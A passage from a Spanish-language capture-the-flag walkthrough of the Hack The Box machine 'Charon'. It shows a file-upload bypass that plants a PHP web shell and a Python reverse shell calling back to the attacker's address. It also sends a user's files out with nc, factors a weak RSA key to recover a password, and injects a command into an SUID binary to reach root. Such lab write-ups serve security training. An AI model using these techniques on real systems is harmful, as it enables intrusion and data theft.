<p>Vemos que nuestro archivo se sube en la ruta <code class="language-plaintext highlighter-rouge">/images/</code>; sin embargo, no presenta la extensión php que necesitamos para poder ejecutar comandos. Si le echamos un ojo al código fuente del sitio, vemos un campo que se encuentra comentado.</p>

<p><img src="/assets/images/htb-charon/charon-web10.png" alt="" /></p>

<p>Vamos a descomentar el campo y modificar el tipo. Además, podemos ver que el nombre está medio raro, como que está en base64, por lo que vamos a descifrarlo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"dGVzdGZpbGUx"</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
</span>testfile1
</code></pre></div></div>

<p>Vemos que el nombre es <code class="language-plaintext highlighter-rouge">testfile1</code>, por lo que vamos a cambiar lo que está en base64 por <code class="language-plaintext highlighter-rouge">testfile1</code>, quedando de la siguiente forma:</p>

<p><img src="/assets/images/htb-charon/charon-web11.png" alt="" /></p>

<p>Ahora vamos a tratar de subir un archivo nuevamente <code class="language-plaintext highlighter-rouge">shell.gif</code> y vamos a agregar algo en el nuevo campo que tenemos, por ejemplo <code class="language-plaintext highlighter-rouge">test</code>.</p>

<p><img src="/assets/images/htb-charon/charon-web12.png" alt="" /></p>

<p>Y vemos que con dicho campo podemos modificar el nombre del archivo, por lo tanto podríamos subir nuevamente nuestra shell <code class="language-plaintext highlighter-rouge">shell.gif</code> y aprovechando el campo para cambiar la extensión.</p>

<p><img src="/assets/images/htb-charon/charon-web13.png" alt="" /></p>

<p>Ahora vamos a validar en la ruta que se nos indica <code class="language-plaintext highlighter-rouge">/images/shell.php</code>:</p>

<p><img src="/assets/images/htb-charon/charon-web14.png" alt="" /></p>

<p>Ya logramos ejecución de comandos a nivel de sistema, así que ahora nos queda es entablarnos una reverse shell, por lo que nos ponemos en escucha a través del puerto 443.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.31/images/shell.php?cmd<span class="o">=</span>python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.27",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.31] 56646
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami
www-data
$ 
</span></code></pre></div></div>

<p>Ya estamos dentro de la máquina, así que primero vamos a realizar un <a href="/tratamiento-tty">Tratamiento de la tty</a> para trabajar más cómodos. Vemos que no podemos visualizar la primera flag, así que vamos a enumerar un poco para ver la forma de migrar a otro usuario o escalar privilegios.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@charon:/home/decoder<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 12
<span class="nt">-rw-r--r--</span> 1 decoder freeeze 138 Jun 23  2017 decoder.pub
<span class="nt">-rw-r--r--</span> 1 decoder freeeze  32 Jun 23  2017 pass.crypt
<span class="nt">-r--------</span> 1 decoder freeeze  33 Jun 23  2017 user.txt
www-data@charon:/home/decoder<span class="err">$</span>
</code></pre></div></div>

<p>Dentro del directorio del usuario <code class="language-plaintext highlighter-rouge">decoder</code>, vemos algunos archivos los cuales podemos ver el contenido que son <code class="language-plaintext highlighter-rouge">decoder.pub</code> y <code class="language-plaintext highlighter-rouge">pass.crypt</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@charon:/home/decoder<span class="nv">$ </span><span class="nb">cat </span>decoder.pub 
<span class="nt">-----BEGIN</span> PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhALxHhYGPVMYmx3vzJbPPAEa10NETXrV3
<span class="nv">mI9wJizmFJhrAgMBAAE</span><span class="o">=</span>
<span class="nt">-----END</span> PUBLIC KEY-----
www-data@charon:/home/decoder<span class="nv">$ </span><span class="nb">cat </span>pass.crypt <span class="p">;</span> <span class="nb">echo
</span>2OSb<span class="s2">"eWgTo7I
www-data@charon:/home/decoder</span><span class="err">$</span><span class="s2">
</span></code></pre></div></div>

<p>Lo que haremos primero será transferirnos los archivos a nuestra máquina.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@charon:/home/decoder<span class="nv">$ </span>nc 10.10.14.27 443 &lt; decoder.pub 
www-data@charon:/home/decoder<span class="nv">$ </span>nc 10.10.14.27 443 &lt; pass.crypt  
www-data@charon:/home/decoder<span class="nv">$ </span><span class="nb">md5sum </span>decoder.pub 
afcb9745eb5e553d7b15077363878c1b  decoder.pub
www-data@charon:/home/decoder<span class="nv">$ </span><span class="nb">md5sum </span>pass.crypt 
ade0dc6187e2fa671c1d7a02d3c9f737  pass.crypt
www-data@charon:/home/decoder<span class="nv">$ </span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> decoder.pub
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.31] 56648
❯ nc <span class="nt">-nlvp</span> 443 <span class="o">&gt;</span> pass.crypt
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.31] 56650
❯ <span class="nb">md5sum </span>decoder.pub
afcb9745eb5e553d7b15077363878c1b  decoder.pub
❯ <span class="nb">md5sum </span>pass.crypt
ade0dc6187e2fa671c1d7a02d3c9f737  pass.crypt
</code></pre></div></div>

<p>Ahora, de acuerdo con las extensiones, <code class="language-plaintext highlighter-rouge">decoder.pub</code> podría ser una llave pública y <code class="language-plaintext highlighter-rouge">pass.crypt</code> es un archivo que ha sido cifrado utilizando la llave privada, pero no contamos con dicha llave; por lo tanto podríamos tratar de obtener la llave privada a partir de la llave pública y para lograrlo, primeramente debemos de encontrar algunas variables que necesitamos (<strong>Nota</strong>: Se comparte un recurso para saber un poco más de este tema <a href="https://pycryptodome.readthedocs.io/en/latest/src/public_key/rsa.html">readthedocs</a>):</p>

<ul>
  <li><strong><em>n</em></strong> - RSA modulus</li>
  <li><strong><em>e</em></strong> - RSA public exponent</li>
  <li><strong><em>p</em></strong> - First factor of the RSA modulus</li>
  <li><strong><em>q</em></strong> - Second factor of the RSA modulus</li>
  <li><strong><em>d</em></strong> - RSA private exponent</li>
  <li><strong><em>m</em></strong> - Remainder component</li>
</ul>

<p>El valor de <strong><em>n</em></strong> es público y se obtiene de la llave pública y de igual forma el valor de <strong><em>e</em></strong>. Ahora, si el valor de <strong><em>n</em></strong> es relativamente pequeño, se puede computar <strong><em>p</em></strong> y <strong><em>q</em></strong> ya que <strong><em>n = p q</em></strong> en donde <strong><em>p</em></strong> y <strong><em>q</em></strong> son números primos. Asi que vamos a generar un programa en python que nos ayude a generar dichos valores.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
#coding:utf-8
</span>  
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
  
<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="s">"decoder.pub"</span><span class="p">,</span><span class="s">"r"</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">e</span>
<span class="n">n</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">n</span>
<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de e = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">key</span><span class="o">.</span><span class="n">e</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de n = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">key</span><span class="o">.</span><span class="n">n</span><span class="p">)</span>
</code></pre></div></div>

<p>Al imprimir las variables, tenemos que:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 decrypter.py
<span class="o">[</span><span class="k">*</span><span class="o">]</span> El valor de e <span class="o">=</span> 65537 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> El valor de n <span class="o">=</span> 85161183100445121230463008656121855194098040675901982832345153586114585729131
</code></pre></div></div>

<p>Ahora para encontrar <strong><em>p</em></strong> y <strong><em>q</em></strong> vamos a hacer uso de <a href="http://factordb.com/">factordb</a></p>

<p><img src="/assets/images/htb-charon/charon-pq.png" alt="" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> El valor de p <span class="o">=</span> 280651103481631199181053614640888768819 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> El valor de q <span class="o">=</span> 303441468941236417171803802700358403049
</code></pre></div></div>

<p>Ahora, el valor de <strong><em>m</em></strong> lo obtenemos de la siguiente expresión: <strong><em>m = n - (p + q - 1)</em></strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> El valor de m <span class="o">=</span> 85161183100445121230463008656121855193513948103479115215992296168773338557264
</code></pre></div></div>

<p>Para encontrar <strong><em>d</em></strong> vamos a hacer uso de la <strong>Función inversa multiplicativa modular</strong> y de los valores que encontramos anteriormente que son <strong><em>e</em></strong> y <strong><em>m</em></strong>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Modular multiplicative inverse function in Python
</span>  <span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
      <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
          <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
          <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
  
  <span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
      <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
      <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
          <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">'modular inverse does not exist'</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
  
  <span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">m</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> El valor de d <span class="o">=</span> 21250987814893564133283367312544315727523797355452606165102736035279600512161
</code></pre></div></div>

<p>Ya con todos los valores obtenidos, podemos generar una llave privada:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">priv_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">construct</span><span class="p">((</span><span class="n">n</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">))</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> La clave privada es:
<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
MIGsAgEAAiEAvEeFgY9UxibHe/Mls88ARrXQ0RNetXeYj3AmLOYUmGsCAwEAAQIg
LvuiAxyjSPcwXGvmgqIrLQxWT1SAKVZwewy/gpO2bKECEQDTI2+4s2LacjlWAWZA
A2kzAhEA5Eizfe3idizLLBr0vsjD6QIRALlM92clYJOQ/csCjWeO1ssCEQDHxRNG
<span class="nv">BVGjRsm5XBGHj1tZAhEAkJAmnUZ7ivTvKY17SIkqPQ</span><span class="o">==</span>
<span class="nt">-----END</span> RSA PRIVATE KEY-----
</code></pre></div></div>

<p>Una vez que tenemos la llave privada, vamos a descifrar el archivo <code class="language-plaintext highlighter-rouge">pass.crypt</code> mediante la herramienta <code class="language-plaintext highlighter-rouge">openssl</code> en donde <code class="language-plaintext highlighter-rouge">private.key</code> es un archivo que contiene nuestra llave privada que generamos y <code class="language-plaintext highlighter-rouge">pass.decrypted</code> es el archivo <code class="language-plaintext highlighter-rouge">pass.crypt</code> ya descifrado:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl rsautl <span class="nt">-decrypt</span> <span class="nt">-inkey</span> private.key <span class="nt">-in</span> pass.crypt <span class="nt">-out</span> pass.decrypted
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>pass.decrypted
───────┬─────────────────────────────────────
       │ File: pass.decrypted
───────┼─────────────────────────────────────
   1   │ nevermindthebollocks
</code></pre></div></div>

<p>Por lo tanto, nuestro programa en python sería el siguiente:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
#coding:utf-8
</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="s">"decoder.pub"</span><span class="p">,</span><span class="s">"r"</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">e</span>
<span class="n">n</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">n</span>
<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="c1"># Con factordb.com se puede obtener p y q ya que n es un número relativamente pequeño
</span><span class="n">p</span> <span class="o">=</span> <span class="mi">280651103481631199181053614640888768819</span>
<span class="n">q</span> <span class="o">=</span> <span class="mi">303441468941236417171803802700358403049</span>

<span class="n">m</span> <span class="o">=</span> <span class="n">n</span> <span class="o">-</span> <span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="n">q</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>

<span class="c1"># Modular multiplicative inverse function in Python
</span><span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
    <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">'modular inverse does not exist'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>

<span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">m</span><span class="p">)</span>

<span class="c1"># Se muestran los valores
</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de e = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">key</span><span class="o">.</span><span class="n">e</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de n = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">key</span><span class="o">.</span><span class="n">n</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de p = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">p</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de q = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">q</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de m = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">m</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"El valor de d = </span><span class="si">%</span><span class="s">s "</span> <span class="o">%</span> <span class="n">d</span><span class="p">)</span>

<span class="c1"># Se genera la llave privada
</span><span class="n">priv_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">construct</span><span class="p">((</span><span class="n">n</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">))</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"La clave privada es:"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">priv_key</span><span class="o">.</span><span class="n">exportKey</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))</span>

<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"private.key"</span><span class="p">,</span><span class="s">"w"</span><span class="p">)</span>
<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">priv_key</span><span class="o">.</span><span class="n">exportKey</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))</span>
<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1"># Se descifra el archivo pass.crypt
</span>
<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"openssl rsautl -decrypt -inkey private.key -in pass.crypt -out pass.decrypted"</span><span class="p">)</span>

</code></pre></div></div>

<p>Tenemos ahora la contraseña <code class="language-plaintext highlighter-rouge">nevermindthebollocks</code>, la cual podría ser del usuario <strong>decoder</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@charon:/home<span class="nv">$ </span>su decoder
Password: 
decoder@charon:/home<span class="nv">$ </span><span class="nb">whoami
</span>decoder
decoder@charon:/home<span class="err">$</span>
</code></pre></div></div>

<p>Ya somos el usuario <strong>decoder</strong> y podemos visualizar la flag (user.txt). Ahora nos falta convertirnos en usuario <strong>root</strong>; por lo que vamos a enumerar un poco el sistema.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>decoder@charon:/home<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>decoder<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>freeeze<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>freeeze<span class="o">)</span>
decoder@charon:/home<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>decoder: 
Sorry, user decoder may not run <span class="nb">sudo </span>on charon.
decoder@charon:/home<span class="nv">$ </span><span class="nb">cd</span> /
decoder@charon:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./usr/local/bin/supershell
./usr/lib/openssh/ssh-keysign
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/snapd/snap-confine
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/eject/dmcrypt-get-device
./usr/bin/pkexec
./usr/bin/sudo
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/gpasswd
./usr/bin/chsh
./usr/bin/passwd
./usr/bin/at
./usr/bin/newgidmap
./usr/bin/newuidmap
./bin/ntfs-3g
./bin/ping6
./bin/mount
./bin/fusermount
./bin/umount
./bin/ping
./bin/su
decoder@charon:/<span class="err">$</span>
</code></pre></div></div>

<p>Vemos un archivo curioso <code class="language-plaintext highlighter-rouge">/usr/local/bin/supershell</code>, asi que vamos a echarle un ojo ya que tenemos permisos SUID.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>decoder@charon:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/local/bin/supershell
<span class="nt">-rwsr-x---</span> 1 root freeeze 9120 Jun 24  2017 /usr/local/bin/supershell
decoder@charon:/<span class="nv">$ </span>/usr/local/bin/supershell
Supershell <span class="o">(</span>very beta<span class="o">)</span>
usage: supershell &lt;cmd&gt;
decoder@charon:/<span class="nv">$ </span>/usr/local/bin/supershell <span class="nb">whoami
</span>Supershell <span class="o">(</span>very beta<span class="o">)</span>
decoder@charon:/<span class="nv">$ </span>strings /usr/local/bin/supershell             
/lib64/ld-linux-x86-64.so.2
tq<span class="nv">$t</span>                       
libc.so.6            
setuid             
<span class="nb">exit                
</span>strncmp             
strncpy                       
puts              
__stack_chk_fail
<span class="nb">printf
</span>strlen
strcspn
system
__libc_start_main
__gmon_start__
GLIBC_2.4
GLIBC_2.2.5
%<span class="s2">"       
AWAVA
AUATL
[]A</span><span class="se">\A</span><span class="s2">]A^A_
|</span><span class="sb">`</span>&amp;&gt;&lt;<span class="s1">'"\[]{};#
Supershell (very beta)
usage: supershell &lt;cmd&gt;
/bin/ls
++[%s]
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.7585
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
strncpy@@GLIBC_2.2.5
strncmp@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
strlen@@GLIBC_2.2.5
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
tonto_chi_legge
strcspn@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
_Jv_RegisterClasses
exit@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
decoder@charon:/$
</span></code></pre></div></div>

<p>De las cadenas imprimibles del binario, ya debemos de ver que se hace uso de <code class="language-plaintext highlighter-rouge">/bin/ls</code> de manera absoluta, es decir, no se hace el llamado a la función <code class="language-plaintext highlighter-rouge">ls</code> tal cual, si no que se escribe de forma absoluta su ruta; así que vamos a tratar de ocuparla.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>decoder@charon:/<span class="nv">$ </span>/usr/local/bin/supershell /bin/ls
Supershell <span class="o">(</span>very beta<span class="o">)</span>
++[/bin/ls]
bin   dev  home        initrd.img.old  lib64    media  opt      root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
decoder@charon:/<span class="nv">$ </span>
decoder@charon:~<span class="nv">$ </span>/usr/local/bin/supershell /bin/ls<span class="p">;</span><span class="nb">whoami
</span>Supershell <span class="o">(</span>very beta<span class="o">)</span>
++[/bin/ls]
decoder.pub  pass.crypt  user.txt
decoder
decoder@charon:~<span class="nv">$ </span>/usr/local/bin/supershell <span class="s2">"/bin/ls;whoami"</span>
Supershell <span class="o">(</span>very beta<span class="o">)</span>
decoder@charon:~<span class="nv">$ </span>/usr/local/bin/supershell <span class="s2">"/bin/ls;</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span>
Supershell <span class="o">(</span>very beta<span class="o">)</span>
decoder@charon:~<span class="nv">$ </span>/usr/local/bin/supershell <span class="s2">"/bin/ls</span><span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span><span class="s2">"</span>
Supershell <span class="o">(</span>very beta<span class="o">)</span>
++[/bin/lsdecoder]
sh: 1: /bin/lsdecoder: not found
decoder@charon:~<span class="nv">$ </span>/usr/local/bin/supershell <span class="s2">"/bin/ls</span><span class="nv">$/</span><span class="s2">
&gt; whoami
&gt; "</span>
Supershell <span class="o">(</span>very beta<span class="o">)</span>
++[/bin/ls<span class="nv">$/</span>
<span class="nb">whoami</span>
<span class="o">]</span>
sh: 1: /bin/ls<span class="nv">$/</span>: not found
root
decoder@charon:~<span class="err">$</span>
</code></pre></div></div>

<p>Al realizar varias pruebas, ya encontramos una forma de ejecutar comandos como el usuario <strong>root</strong> y lo logramos escapando del contexto con <code class="language-plaintext highlighter-rouge">$/ \n whoami \n "</code> y vemos <strong>root</strong>. Por lo tanto, ahora vamos a lanzarnos una <code class="language-plaintext highlighter-rouge">bash</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>decoder@charon:~<span class="nv">$ </span>/usr/local/bin/supershell <span class="s2">"/bin/ls</span><span class="nv">$/</span><span class="s2">
&gt; bash
&gt; "</span>
Supershell <span class="o">(</span>very beta<span class="o">)</span>
++[/bin/ls<span class="nv">$/</span>
bash
<span class="o">]</span>
sh: 1: /bin/ls<span class="nv">$/</span>: not found
root@charon:~# <span class="nb">whoami
</span>root
root@charon:~#
</code></pre></div></div>

<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#injection" class="page__taxonomy-item" rel="tag">Injection</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">PHP</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#sql" class="page__taxonomy-item" rel="tag">SQL</a><span class="sep">, </span>
    
      
      
